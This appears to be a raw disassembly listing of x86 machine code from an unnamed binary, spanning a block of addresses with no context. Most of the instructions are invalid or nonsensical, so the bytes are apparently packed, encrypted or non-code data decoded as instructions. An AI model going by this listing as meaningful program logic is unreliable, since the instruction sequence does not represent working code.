  4091ed:	sub    DWORD PTR [ebx+0x2d],eax
  4091f0:	xor    BYTE PTR [eax+0x76d7120e],dh
  4091f6:	or     DWORD PTR [edx-0x52],edi
  4091f9:	inc    edx
  4091fa:	rcl    edi,1
  4091fc:	cmp    al,0x9c
  4091fe:	pop    ecx
  4091ff:	add    eax,edi
  409201:	(bad)  
  409202:	(bad)  
  409203:	xchg   ecx,eax
  409204:	cld    
  409205:	jle    0x409236
  409207:	adc    DWORD PTR [eax+0x255f0496],0x48e23a99
  409211:	call   0x5b41d1ed
  409216:	xor    ch,BYTE PTR [edi-0x74]
  409219:	pop    ecx
  40921a:	or     al,0xa
  40921c:	sub    al,0x8a
  40921e:	ss dec eax
  409220:	or     BYTE PTR [ecx-0x40],0x98
  409224:	loope  0x409286
  409226:	sbb    eax,0x16f8a31d
  40922b:	adc    BYTE PTR [ebx-0x75b27050],ch
  409231:	xor    al,0x55
  409233:	jmp    0xfd30:0xa14caef8
  40923a:	push   ebp
  40923b:	inc    edi
  40923c:	ret    
  40923d:	push   cs
  40923e:	loop   0x40928b
  409240:	in     al,0x6f
  409242:	push   esp
  409243:	jg     0x40925b
  409245:	mov    ebx,0xe53b921c
  40924a:	mov    ebp,0x5bdb0268
  40924f:	ror    DWORD PTR [ebp+0x69],1
  409252:	dec    eax
  409253:	xor    DWORD PTR [eax+0x4d1d6f2f],eax
  409259:	ret    0xf75a
  40925c:	xchg   BYTE PTR [ebx],al
  40925e:	fild   DWORD PTR [ebp+0x773d82a2]
  409264:	ds jno 0x409231
  409267:	xor    ebx,DWORD PTR [edx+0x19]
  40926a:	add    DWORD PTR [ecx+0x214952a5],esi
  409270:	sti    
  409271:	jns    0x409299
  409273:	scas   al,BYTE PTR es:[edi]
  409274:	sar    BYTE PTR [esi-0x4f],1
  409277:	bndstx [ebx+0x536e3d95],(bad)
  40927e:	mov    DWORD PTR [eax],edi
  409280:	or     dh,BYTE PTR [ebp-0x3b]
  409283:	cmp    BYTE PTR [eax],dl
  409285:	xchg   edi,eax
  409286:	retf   
  409287:	cs add eax,0xf7ef87f4
  40928d:	and    dl,BYTE PTR [edx-0x19d53453]
  409293:	dec    ecx
  409294:	sub    ebp,DWORD PTR [esi-0x53]
  409297:	pop    edi
  409298:	and    eax,0x5fd92ef3
  40929d:	cwde   
  40929e:	mov    fs,edi
  4092a0:	jg     0x4092d2
  4092a2:	push   0xfb5fc0cb
  4092a7:	hlt    
  4092a8:	pop    ss
  4092a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092aa:	or     DWORD PTR [edi+0x4c],edx
  4092ad:	push   eax
  4092ae:	mov    ebx,0x1338ff73
  4092b3:	mov    esp,0x85b2ef7d
  4092b8:	and    eax,0x2759bb87
  4092bd:	aad    0x10
  4092bf:	dec    edi
  4092c0:	xor    eax,0xbd89f8cc
  4092c5:	cmp    al,cl
  4092c7:	pop    ebx
  4092c8:	imul   bl
  4092ca:	xchg   ecx,eax
  4092cb:	ficom  WORD PTR [edx]
  4092cd:	xchg   ebp,eax
  4092ce:	mov    al,0x89
  4092d0:	mov    ecx,0x31ab3bb2
  4092d5:	xchg   esp,eax
  4092d6:	fisub  DWORD PTR [ebx]
  4092d8:	mov    ?,WORD PTR ds:[edx+0x4ec02419]
  4092df:	test   ebp,0x5d21f700
  4092e5:	adc    BYTE PTR [ebx+0x2a],bh
  4092e8:	and    DWORD PTR [eax-0x3ac33910],esi
  4092ee:	ins    BYTE PTR es:[edi],dx
  4092ef:	push   0x33
  4092f1:	mov    eax,0x4201c7ce
  4092f6:	addr16 inc ebp
  4092f8:	jno    0x409301
  4092fa:	mov    cl,0x70
  4092fc:	cli    
  4092fd:	push   ss
  4092fe:	hlt    
  4092ff:	jecxz  0x409362
  409301:	push   edi
  409302:	enter  0x5bc0,0xfc
  409306:	dec    esp
  409307:	(bad)  
  409308:	sub    dh,BYTE PTR [eax+0x3]
  40930b:	or     al,0x6e
  40930d:	mov    ebp,0xcb62f414
  409312:	jae    0x40929a
  409314:	jb     0x40935f
  409316:	retf   
  409317:	push   edi
  409318:	aam    0xc7
  40931a:	aas    
  40931b:	push   ecx
  40931c:	inc    esp
  40931d:	and    edx,DWORD PTR [eax-0x5f]
  409320:	jnp    0x409370
  409322:	(bad)  
  409324:	ja     0x4092b5
  409326:	ins    BYTE PTR es:[edi],dx
  409327:	mov    dl,0xb4
  409329:	mov    es,WORD PTR [esi]
  40932b:	inc    ebp
  40932c:	mov    ss,WORD PTR [ebx+0x2a068088]
  409332:	out    dx,al
  409333:	bound  ebx,QWORD PTR [edi-0x43b4bcef]
  409339:	lds    esi,FWORD PTR [esi]
  40933b:	test   eax,0xb70b9893
  409340:	pop    ecx
  409341:	loope  0x4093ab
  409343:	inc    esi
  409344:	jl     0x409341
  409346:	mov    ds:0x3ad284a1,al
  40934b:	mov    DWORD PTR [eax],edx
  40934d:	nop
  40934e:	stos   DWORD PTR es:[edi],eax
  40934f:	and    al,0x4a
  409351:	daa    
  409352:	mov    eax,ds:0x4fa712a9
  409357:	mov    ds:0xca08af21,eax
  40935c:	mov    edi,0xff26095f
  409361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409362:	jge    0x4092e6
  409364:	(bad)  
  409365:	call   0xf94047e
  40936a:	sub    bl,BYTE PTR [ebp+0x22]
  40936d:	inc    esi
  40936e:	sub    ch,BYTE PTR [ecx]
  409370:	jmp    0xe89d2556
  409375:	pop    ebp
  409376:	or     cl,BYTE PTR ds:0xe36e7ec5
  40937c:	adc    eax,0x56e100dc
  409381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409382:	cmp    BYTE PTR [eax-0x3a],dl
  409385:	int    0xad
  409387:	xchg   edi,eax
  409388:	dec    esp
  409389:	in     eax,0x41
  40938b:	scas   eax,DWORD PTR es:[edi]
  40938c:	loopne 0x4093e8
  40938e:	ror    DWORD PTR [ebp-0x2233cdb0],cl
  409394:	xlat   BYTE PTR ds:[ebx]
  409395:	clc    
  409396:	pusha  
  409397:	xchg   esi,eax
  409398:	out    0x49,al
  40939a:	push   ecx
  40939b:	call   0xdc29cf5b
  4093a0:	pusha  
  4093a1:	les    ebp,FWORD PTR [ecx-0x3d]
  4093a4:	cmp    eax,0x320a4c44
  4093a9:	pusha  
  4093aa:	fiadd  DWORD PTR [esi+0xf]
  4093ad:	xchg   DWORD PTR [edx-0x3c],ebx
  4093b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093b1:	jmp    0xaed0:0x4db79562
  4093b8:	or     BYTE PTR [edi],bl
  4093ba:	test   eax,0x3eaaffb
  4093bf:	xchg   esp,eax
  4093c0:	xchg   esi,eax
  4093c1:	cdq    
  4093c2:	sub    ebp,edi
  4093c4:	add    BYTE PTR [ebp+0x6f],cl
  4093c7:	xor    eax,0xed7a8825
  4093cc:	mov    ah,0x3b
  4093ce:	stos   DWORD PTR es:[edi],eax
  4093cf:	fst    QWORD PTR [ebx+0x30]
  4093d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d3:	scas   al,BYTE PTR es:[edi]
  4093d4:	shl    bh,0xd6
  4093d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093d8:	gs pop edx
  4093da:	push   esp
  4093db:	push   cs
  4093dc:	pusha  
  4093dd:	repz mov esp,0x8c5549e1
  4093e3:	ret    
  4093e4:	xchg   ebp,eax
  4093e5:	sbb    eax,0x883a6154
  4093ea:	push   0x3d
  4093ec:	add    eax,0x2b9e7fc5
  4093f1:	inc    edi
  4093f2:	movzx  esi,BYTE PTR [ebx]
  4093f5:	sbb    eax,0xe340d1d0
  4093fa:	dec    esp
  4093fb:	(bad)  
  4093fc:	mov    DWORD PTR [edx+0x15],edi
  4093ff:	mov    ecx,0x716f2fe0
  409404:	iret   
  409405:	inc    edi
  409406:	inc    esp
  409407:	cdq    
  409408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409409:	mov    edi,0xbee33ea7
  40940e:	stc    
  40940f:	mov    WORD PTR [eax+0x35],fs
  409412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409413:	icebp  
  409414:	mov    dh,0x1
  409416:	mov    eax,ds:0x77f9c8d4
  40941b:	pop    es
  40941c:	pop    edi
  40941d:	adc    al,0xd5
  40941f:	setg   BYTE PTR [ebp-0x6e]
  409423:	fidivr WORD PTR [esi+0x36d65c10]
  409429:	adc    al,0x2f
  40942b:	fst    DWORD PTR [esi+0x40]
  40942e:	pop    es
  40942f:	sbb    bh,ch
  409431:	cmp    DWORD PTR [ecx+0x7d],edi
  409434:	pop    es
  409435:	mov    ebx,0x8ddf0097
  40943a:	xchg   edx,eax
  40943b:	imul   DWORD PTR [esi+0x51]
  40943e:	icebp  
  40943f:	inc    ebx
  409440:	inc    DWORD PTR [edx-0x28]
  409443:	cdq    
  409444:	jbe    0x409403
  409446:	sbb    al,0x7e
  409448:	test   al,0xb7
  40944a:	xor    edx,esi
  40944c:	xor    ah,bl
  40944e:	pop    edi
  40944f:	mov    edx,0xb9341842
  409454:	test   BYTE PTR [edi+0x7e58b21],bl
  40945a:	push   ecx
  40945b:	jmp    0xf105b3f1
  409460:	fimul  WORD PTR [ebp-0x48167078]
  409466:	mov    ebx,0xdfe5e05b
  40946b:	and    al,0x33
  40946d:	adc    bh,BYTE PTR [ebx]
  40946f:	xor    ebx,ebp
  409471:	call   DWORD PTR [ebx+0xef71f69]
  409477:	jns    0x4094dd
  409479:	sub    eax,0x34913a5c
  40947e:	hlt    
  40947f:	in     eax,0xbe
  409481:	push   esp
  409482:	mov    ds:0x3a66575e,al
  409487:	(bad)  
  409489:	pop    fs
  40948b:	pushf  
  40948c:	int    0xa5
  40948e:	dec    ebx
  40948f:	mov    bl,BYTE PTR [edx]
  409491:	sbb    ah,BYTE PTR [ebx]
  409493:	pusha  
  409494:	or     eax,0xf40daad8
  409499:	xchg   DWORD PTR [edx-0x5c],ebp
  40949c:	mov    cl,0x46
  40949e:	jge    0x409492
  4094a0:	push   cs
  4094a1:	pop    ss
  4094a2:	fidivr WORD PTR [edx+0x42]
  4094a5:	popa   
  4094a6:	and    ebx,DWORD PTR [ebp+0x5f]
  4094a9:	mov    bl,BYTE PTR [eax-0x2c557a17]
  4094af:	pop    ebp
  4094b0:	call   0xc914:0xebc897d9
  4094b7:	cmp    BYTE PTR [ebx+edx*2],dl
  4094ba:	lock inc ebp
  4094bc:	cmp    DWORD PTR [edx-0x462ee0fc],eax
  4094c2:	test   BYTE PTR [eax-0x2b7ff972],cl
  4094c8:	lea    ebx,[ebx+0x40e7712c]
  4094ce:	xchg   esp,eax
  4094cf:	inc    ecx
  4094d0:	retf   
  4094d1:	call   0x2a9709e0
  4094d6:	jb     0x4094f4
  4094d8:	aas    
  4094d9:	jecxz  0x4094df
  4094db:	sub    ecx,DWORD PTR [ebp-0x41]
  4094de:	retf   
  4094df:	test   BYTE PTR [eax+0x4a],dl
  4094e2:	xchg   esi,eax
  4094e3:	xchg   BYTE PTR [edi],dh
  4094e5:	xor    eax,0xdaefe8f5
  4094ea:	call   0xfe5b:0x319e3d63
  4094f1:	out    0x77,eax
  4094f3:	loopne 0x40956c
  4094f5:	sbb    DWORD PTR [edx-0x72],ebx
  4094f8:	fs cld 
  4094fa:	sahf   
  4094fb:	call   0x99af:0x19d92287
  409502:	xchg   ebx,eax
  409503:	rcl    DWORD PTR [esi-0x14],0x13
  409507:	ds jne 0x40948f
  40950a:	xchg   esp,eax
  40950b:	ja     0x40954e
  40950d:	pop    ebp
  40950e:	aaa    
  40950f:	repnz fnsave [ebp-0x90b2774]
  409516:	out    0xf6,al
  409518:	sbb    esp,DWORD PTR [edx-0x3d9a98db]
  40951e:	in     al,0x5f
  409520:	inc    ecx
  409521:	push   0xcc4f4f84
  409526:	ds pop ss
  409528:	or     BYTE PTR [ebx+0x40],bh
  40952b:	(bad)  
  40952d:	ss repz add eax,0x6216c76b
  409534:	xor    al,0x44
  409536:	aaa    
  409537:	adc    ebx,DWORD PTR [ebp-0x53a9fc79]
  40953d:	sti    
  40953e:	cmp    al,0xfa
  409540:	mov    eax,ds:0x61bcaa85
  409545:	lahf   
  409546:	out    0x7c,eax
  409548:	nop
  409549:	xchg   esi,eax
  40954a:	out    dx,al
  40954b:	pop    es
  40954c:	sub    ecx,ebp
  40954e:	aas    
  40954f:	sti    
  409550:	pusha  
  409551:	int    0xdb
  409553:	leave  
  409554:	xor    al,0x7
  409556:	jecxz  0x409555
  409558:	ret    0xf199
  40955b:	stos   BYTE PTR es:[edi],al
  40955c:	jecxz  0x409507
  40955e:	xchg   esp,eax
  40955f:	mov    ds:0x581426bf,al
  409564:	or     eax,0x66eb5c98
  409569:	cmp    BYTE PTR [esi-0xd255198],0x8d
  409570:	scas   eax,DWORD PTR es:[edi]
  409571:	inc    edx
  409572:	div    BYTE PTR [ebp-0x2d]
  409575:	out    0x6f,al
  409577:	jmp    0x6a02:0x26ec76d7
  40957e:	sbb    DWORD PTR [edi+eiz*4-0x1b8dc14e],esi
  409585:	inc    edx
  409586:	(bad)  
  409587:	pop    esp
  409588:	rcr    DWORD PTR [esi+0x6720e987],cl
  40958e:	rol    DWORD PTR [ebx+0x150d0102],cl
  409594:	adc    al,0x5a
  409596:	lods   eax,DWORD PTR ds:[esi]
  409597:	imul   ecx,DWORD PTR [ebx],0xffffff9b
  40959a:	mov    esi,0xcc2e36ec
  40959f:	mov    ah,BYTE PTR [ebp-0x19e2089d]
  4095a5:	fldcw  WORD PTR [ecx+ecx*1]
  4095a8:	sub    eax,0x6b0a7d2a
  4095ad:	mov    ch,0xd2
  4095af:	fucomp st(5)
  4095b1:	dec    esi
  4095b2:	or     esp,DWORD PTR [esi]
  4095b4:	out    dx,eax
  4095b5:	mov    edx,0x580c65a6
  4095ba:	and    dh,bh
  4095bc:	test   al,0x25
  4095be:	inc    esp
  4095bf:	jmp    0x32ff6c90
  4095c4:	fcomp  DWORD PTR [edx+esi*4+0x13]
  4095c8:	push   esp
  4095c9:	shr    DWORD PTR [edi],0x60
  4095cc:	ret    
  4095cd:	mov    esp,0xf00c0385
  4095d2:	add    al,0xa8
  4095d4:	mov    edx,0xac901345
  4095d9:	ret    
  4095da:	arpl   WORD PTR [esp+ebx*8-0x4d78508f],cx
  4095e1:	sbb    al,0xab
  4095e3:	loope  0x4095f1
  4095e5:	push   es
  4095e6:	jbe    0x409584
  4095e8:	push   ebp
  4095e9:	sar    BYTE PTR [ebx-0x449dcedf],1
  4095ef:	cmp    ch,BYTE PTR [edx+0x4c]
  4095f2:	imul   esp,eax,0xffffffc0
  4095f5:	(bad)  
  4095f6:	jo     0x40959f
  4095f8:	inc    edi
  4095f9:	fcom   DWORD PTR [esi+0x2f4f6139]
  4095ff:	popa   
  409600:	sub    BYTE PTR [edi-0x198861c2],al
  409606:	(bad)  
  409607:	out    0x93,eax
  409609:	hlt    
  40960a:	mov    ds:0x7dfbec44,eax
  40960f:	cwde   
  409610:	ja     0x4095ba
  409612:	mov    dh,0xf2
  409614:	mov    ecx,DWORD PTR [eax+ebp*2-0x59]
  409618:	out    dx,al
  409619:	xor    ah,dh
  40961b:	push   es
  40961c:	in     eax,0x7e
  40961e:	pop    edx
  40961f:	fs inc eax
  409621:	lds    ebx,FWORD PTR [ebx]
  409623:	jp     0x4095a8
  409625:	cmp    BYTE PTR [ebx-0xa],0xf3
  409629:	add    BYTE PTR [esi],bl
  40962b:	ds pop esi
  40962d:	cmp    DWORD PTR [ebp+0x65e329b6],ecx
  409633:	cmp    edi,esi
  409635:	ret    
  409636:	gs iret 
  409638:	xchg   esi,eax
  409639:	xor    eax,DWORD PTR [edx+0xccc5c43]
  40963f:	inc    ebx
  409640:	icebp  
  409641:	pcmpeqw mm4,QWORD PTR [ebx-0x621071a9]
  409648:	and    edi,DWORD PTR [ebx+ecx*2-0x64f237a5]
  40964f:	rol    BYTE PTR [edx-0xb],cl
  409652:	dec    esi
  409653:	mov    ebx,0xc03d78c6
  409658:	mov    esp,0x3f93c234
  40965d:	xor    BYTE PTR [eax],dh
  40965f:	xor    eax,0x2bf0def0
  409664:	jbe    0x40968d
  409666:	cmc    
  409667:	mov    ah,0x4f
  409669:	add    edi,DWORD PTR [eax+edi*8]
  40966c:	xchg   eax,eax
  40966e:	ins    BYTE PTR es:[edi],dx
  40966f:	inc    ecx
  409670:	mov    ebp,0x1ae71149
  409675:	(bad)  
  409676:	adc    eax,0x136ada7e
  40967b:	fadd   QWORD PTR [si]
  40967e:	pop    esp
  40967f:	cmp    al,0x88
  409681:	les    esi,FWORD PTR [edx+ebp*4-0x5b953d9d]
  409688:	imul   esi,ebp,0xffffffc9
  40968b:	and    al,0xe3
  40968d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40968e:	cmp    al,0x9b
  409690:	jno    0x4096b2
  409692:	cmp    ebx,ebp
  409694:	or     DWORD PTR [ecx],0x2c
  409697:	in     al,dx
  409698:	dec    ecx
  409699:	call   0x6e73:0x3c2c8c6b
  4096a0:	dec    edx
  4096a1:	test   eax,0x74c9dd90
  4096a6:	and    al,0x17
  4096a8:	mov    eax,ds:0xd76220cb
  4096ad:	mov    dh,al
  4096af:	sub    DWORD PTR [ecx+0x55],ebx
  4096b2:	mov    ah,0xe8
  4096b4:	adc    esp,DWORD PTR [edi-0x496f7570]
  4096ba:	mov    ah,BYTE PTR ds:0x8d674297
  4096c0:	out    dx,al
  4096c1:	xor    ah,BYTE PTR [ebx+0x44]
  4096c4:	aam    0x72
  4096c6:	mov    dh,0x51
  4096c8:	xchg   ecx,eax
  4096c9:	dec    esp
  4096ca:	into   
  4096cb:	pop    eax
  4096cc:	push   ebx
  4096cd:	xchg   ebx,eax
  4096ce:	sbb    BYTE PTR [ebp+0x10],ah
  4096d1:	ret    
  4096d2:	push   ebp
  4096d3:	scas   eax,DWORD PTR es:[edi]
  4096d4:	dec    eax
  4096d5:	ror    BYTE PTR [ebp+0x1d5de561],cl
  4096db:	jp     0x409707
  4096dd:	cmp    DWORD PTR [edi],esi
  4096df:	push   esp
  4096e0:	mov    edx,0x9d81b7c5
  4096e5:	xchg   esi,eax
  4096e6:	pop    ebx
  4096e7:	sub    eax,0x564c2ac7
  4096ec:	icebp  
  4096ed:	nop
  4096ee:	repnz xchg ebx,eax
  4096f0:	fcmovbe st,st(6)
  4096f2:	sahf   
  4096f3:	or     bl,bh
  4096f5:	sahf   
  4096f6:	repz fist WORD PTR [esi+edx*4]
  4096fa:	stos   BYTE PTR es:[edi],al
  4096fb:	push   edi
  4096fc:	xchg   ebx,eax
  4096fd:	cmp    eax,0x4e51ad4f
  409702:	test   BYTE PTR [edi],bl
  409704:	jbe    0x409686
  409706:	adc    BYTE PTR [ebp-0x18824633],bl
  40970c:	mov    esp,0x6d42ada5
  409711:	add    bl,BYTE PTR [eax+eiz*2-0x21]
  409715:	mov    ebp,0xb890f17
  40971a:	mov    ebx,0x291e9403
  40971f:	inc    esi
  409720:	push   ds
  409721:	push   edi
  409722:	(bad)  
  409723:	xchg   esp,eax
  409724:	xor    cl,BYTE PTR [ebp+0x3002b5b0]
  40972a:	popf   
  40972b:	or     al,0x94
  40972d:	xchg   edx,eax
  40972e:	pop    ecx
  40972f:	cmp    eax,0x5baa2de9
  409734:	bound  edi,QWORD PTR [eax-0x6fd1f2d3]
  40973a:	and    DWORD PTR [ebx],edi
  40973c:	mov    esi,DWORD PTR [edi+edx*4]
  40973f:	jp     0x40971a
  409741:	and    DWORD PTR [edx-0x23],ebp
  409744:	or     bl,bl
  409746:	std    
  409747:	pop    ebx
  409748:	ds pop esp
  40974a:	lods   al,BYTE PTR ds:[esi]
  40974b:	inc    esi
  40974c:	(bad)  
  40974d:	sub    eax,0x12469548
  409752:	push   cs
  409753:	or     ecx,DWORD PTR [ebp-0x65]
  409756:	mov    ecx,0x54fe4293
  40975b:	push   0x48a70ec2
  409760:	jbe    0x409718
  409762:	add    al,0x7f
  409764:	aaa    
  409765:	sahf   
  409766:	jne    0x40974c
  409768:	push   ebx
  409769:	pop    ebx
  40976a:	adc    cl,al
  40976c:	xchg   ebp,eax
  40976d:	mov    esi,0x973d4431
  409772:	rol    DWORD PTR [ebx],cl
  409774:	mov    bh,0x4c
  409776:	pop    ss
  409777:	scas   eax,DWORD PTR es:[edi]
  409778:	ret    0xc568
  40977b:	inc    edi
  40977c:	dec    dl
  40977e:	and    dh,BYTE PTR [eax+edx*1-0x1a]
  409782:	pop    es
  409783:	mov    al,0x55
  409785:	and    eax,0xf378b9e
  40978a:	xor    eax,0xed412caa
  40978f:	stos   DWORD PTR es:[edi],eax
  409790:	dec    esi
  409791:	popa   
  409792:	leave  
  409793:	div    bh
  409795:	or     al,0xdb
  409797:	sbb    ebx,DWORD PTR [edx-0x7d]
  40979a:	or     edi,0x0
  40979d:	push   ecx
  40979e:	jge    0x4097c4
  4097a0:	pop    eax
  4097a1:	repnz push 0xd13508d7
  4097a7:	dec    eax
  4097a8:	popa   
  4097a9:	jg     0x40974d
  4097ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097ac:	mov    bh,0x2a
  4097ae:	out    0x3d,al
  4097b0:	in     eax,dx
  4097b1:	call   0xa61e31f
  4097b6:	or     bh,bl
  4097b8:	sar    BYTE PTR [eax],0x25
  4097bb:	add    ecx,ebx
  4097bd:	or     al,0xa8
  4097bf:	push   eax
  4097c0:	mov    DWORD PTR [ebx-0x28],ecx
  4097c3:	add    DWORD PTR [edi+eiz*2-0x5d95c8e9],ebp
  4097ca:	repz arpl bx,ax
  4097cd:	push   ss
  4097ce:	push   ds
  4097cf:	and    dh,BYTE PTR [ecx+ebp*2]
  4097d2:	cmp    bh,BYTE PTR [eax+0x340f94aa]
  4097d8:	or     al,0x95
  4097da:	and    BYTE PTR [ebp+0x7fe5a612],bl
  4097e0:	xor    eax,0x2a8b20cd
  4097e5:	data16 mov dh,0x85
  4097e8:	sub    al,0x6f
  4097ea:	xor    al,0xf0
  4097ec:	or     al,0x23
  4097ee:	fdivr  DWORD PTR [esi]
  4097f0:	dec    esp
  4097f1:	cmp    dl,BYTE PTR ds:0x35222cf0
  4097f7:	icebp  
  4097f8:	and    eax,0xd3ce3376
  4097fd:	push   0x25
  4097ff:	out    0xb,al
  409801:	lods   al,BYTE PTR ds:[esi]
  409802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409803:	aam    0x93
  409805:	jb     0x409858
  409807:	inc    edx
  409808:	outs   dx,BYTE PTR es:[esi]
  40980a:	ss push es
  40980c:	push   es
  40980d:	add    bl,BYTE PTR [edi]
  40980f:	sar    ch,cl
  409811:	retf   0x81df
  409814:	fdiv   st(3),st
  409816:	ret    
  409817:	out    0xc0,al
  409819:	mulps  xmm3,XMMWORD PTR [eax+0x72]
  40981d:	mov    cl,0x12
  40981f:	dec    ebx
  409820:	xor    DWORD PTR [edi+0x5b],ebx
  409823:	(bad)  
  409825:	aas    
  409826:	push   ebp
  409827:	call   DWORD PTR [edx+0x4c]
  40982a:	out    0x30,eax
  40982c:	sbb    al,0x2e
  40982e:	mov    WORD PTR [esi+ebx*4],?
  409831:	xor    ah,BYTE PTR [edx+0x28b8937]
  409837:	rcl    BYTE PTR [esi+0xe],cl
  40983a:	shl    DWORD PTR [ecx-0x54],0xb2
  40983e:	lock clc 
  409840:	psrad  mm4,QWORD PTR [esi+0x5e]
  409844:	das    
  409845:	aaa    
  409846:	mov    es,WORD PTR ds:0x87bba1eb
  40984c:	add    eax,0x51a5026d
  409851:	add    BYTE PTR [esi+0x5eda8a4a],0xe8
  409858:	iret   
  409859:	add    eax,0x870b94fa
  40985e:	jge    0x409810
  409860:	scas   al,BYTE PTR es:[edi]
  409861:	hlt    
  409862:	pop    eax
  409863:	ficom  WORD PTR [esi+0x1]
  409866:	xor    al,0xbe
  409868:	push   ebx
  409869:	(bad)  
  40986a:	fnstsw WORD PTR [esp+eiz*4+0x6e9d102c]
  409871:	stos   BYTE PTR es:[edi],al
  409872:	sbb    DWORD PTR [edi+0x6b],ecx
  409875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409876:	daa    
  409877:	cs ins BYTE PTR es:[edi],dx
  409879:	add    al,0x97
  40987b:	cli    
  40987c:	jbe    0x40985f
  40987e:	add    ebx,DWORD PTR ds:0xfb01
  409883:	or     DWORD PTR [edi-0x4f33ab3f],ecx
  409889:	sahf   
  40988a:	out    0x74,eax
  40988c:	jp     0x409831
  40988e:	ins    DWORD PTR es:[edi],dx
  40988f:	lods   eax,DWORD PTR ds:[esi]
  409890:	fstp   TBYTE PTR [ebx]
  409892:	cmp    bl,BYTE PTR [edi+0x50]
  409895:	pop    ebx
  409896:	fiadd  WORD PTR [edx-0x29]
  409899:	fs xor al,0x1e
  40989c:	and    bl,BYTE PTR [edi+0x4f6b0c0b]
  4098a2:	lods   al,BYTE PTR ds:[esi]
  4098a3:	retf   
  4098a4:	fwait
  4098a5:	int3   
  4098a6:	hlt    
  4098a7:	mov    ch,0xf5
  4098a9:	mov    al,ds:0x71f58b30
  4098ae:	popa   
  4098af:	mov    ah,cl
  4098b1:	sub    al,0x40
  4098b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098b4:	ds popf 
  4098b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098b7:	and    DWORD PTR [ebx+ebx*2-0x3cc29122],0x67
  4098bf:	(bad)  [edi-0x5d]
  4098c2:	les    ebx,FWORD PTR [edi+0x10]
  4098c5:	sbb    al,0x36
  4098c7:	add    esi,esi
  4098c9:	outs   dx,BYTE PTR ds:[esi]
  4098ca:	push   ds
  4098cb:	daa    
  4098cc:	adc    eax,0x924fbef1
  4098d1:	sub    dl,ch
  4098d3:	xchg   BYTE PTR [edx-0x65],bh
  4098d6:	call   0x91182226
  4098db:	adc    DWORD PTR [esi+0xaed9451],eax
  4098e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098e2:	ins    DWORD PTR es:[edi],dx
  4098e3:	mov    dh,0x8d
  4098e5:	lea    eax,[edi]
  4098e7:	mov    eax,0xee745f0a
  4098ec:	scas   al,BYTE PTR es:[edi]
  4098ed:	dec    esi
  4098ee:	out    dx,eax
  4098ef:	ins    BYTE PTR es:[edi],dx
  4098f0:	xor    dl,ch
  4098f2:	push   es
  4098f3:	lea    ebp,[ecx+0x424541ed]
  4098f9:	and    edi,DWORD PTR [edx]
  4098fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098fc:	adc    DWORD PTR [esi+0x29],0xe19444ea
  409903:	ds pushf 
  409905:	jno    0x409945
  409907:	call   0xdffbba44
  40990c:	pop    eax
  40990d:	jno    0x40997f
  40990f:	test   al,0x75
  409911:	test   eax,0x7f99a0c7
  409916:	je     0x409941
  409918:	in     al,0xeb
  40991a:	repnz xchg esp,esi
  40991d:	loope  0x4098f8
  40991f:	and    eax,0x4d4298d2
  409924:	int3   
  409925:	push   ds
  409926:	stos   BYTE PTR es:[edi],al
  409927:	call   0x6456:0xc75cc54b
  40992e:	add    al,0xd6
  409930:	cmp    esi,ecx
  409932:	dec    ebp
  409933:	xor    al,BYTE PTR [esi]
  409935:	into   
  409936:	daa    
  409937:	jmp    0x2fc08862
  40993c:	std    
  40993d:	xor    al,0x45
  40993f:	adc    eax,0xd4686c7
  409944:	into   
  409945:	jae    0x4099bb
  409947:	ficom  WORD PTR [esi-0x72]
  40994a:	test   al,0xb5
  40994c:	jb     0x4099a7
  40994e:	das    
  40994f:	adc    eax,DWORD PTR [ebp-0x4e]
  409952:	mov    ds:0xc77e7d15,al
  409957:	cli    
  409958:	and    DWORD PTR [eax],esp
  40995a:	daa    
  40995b:	sbb    al,0x38
  40995d:	dec    ecx
  40995e:	xchg   DWORD PTR [edi+0x497b9440],ebp
  409964:	add    cl,ah
  409966:	data16 cmc 
  409968:	pop    esi
  409969:	fimul  WORD PTR [edx]
  40996b:	sar    esi,cl
  40996d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40996e:	(bad)  
  40996f:	cli    
  409970:	push   es
  409971:	call   0x565b85be
  409976:	xchg   ebp,eax
  409977:	sete   BYTE PTR [edi-0x48]
  40997b:	in     al,0x7d
  40997d:	cdq    
  40997e:	xchg   bl,dl
  409980:	dec    ebx
  409981:	pop    edi
  409982:	mov    cl,BYTE PTR [esi]
  409984:	lods   eax,DWORD PTR ds:[esi]
  409985:	pusha  
  409986:	test   dl,bl
  409988:	in     al,0x88
  40998a:	cmc    
  40998b:	enter  0x458c,0x56
  40998f:	rcr    BYTE PTR [edi-0x2cab7835],1
  409995:	ss aam 0xd
  409998:	mov    DWORD PTR [edi+0x3f],ebx
  40999b:	pop    ss
  40999c:	std    
  40999d:	in     al,dx
  40999e:	mov    bl,0xad
  4099a0:	pop    ebp
  4099a1:	hlt    
  4099a2:	jl     0x4099ed
  4099a4:	out    dx,al
  4099a5:	jns    0x409a1c
  4099a7:	cmp    eax,0x1a859569
  4099ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099ad:	mov    al,ah
  4099af:	or     al,0xf4
  4099b1:	inc    ebp
  4099b2:	sar    DWORD PTR [edi],0x2f
  4099b5:	rol    ecx,cl
  4099b7:	jmp    0x572b:0x6fc62115
  4099be:	into   
  4099bf:	shl    ah,cl
  4099c1:	jne    0x409958
  4099c3:	cmp    eax,0xed44022
  4099c8:	pop    esi
  4099c9:	repnz adc DWORD PTR [ebp-0xdd0f075],esp
  4099d0:	dec    ebp
  4099d1:	pop    ebp
  4099d2:	ds push ecx
  4099d4:	dec    edi
  4099d5:	fist   DWORD PTR [ebx-0x20d92133]
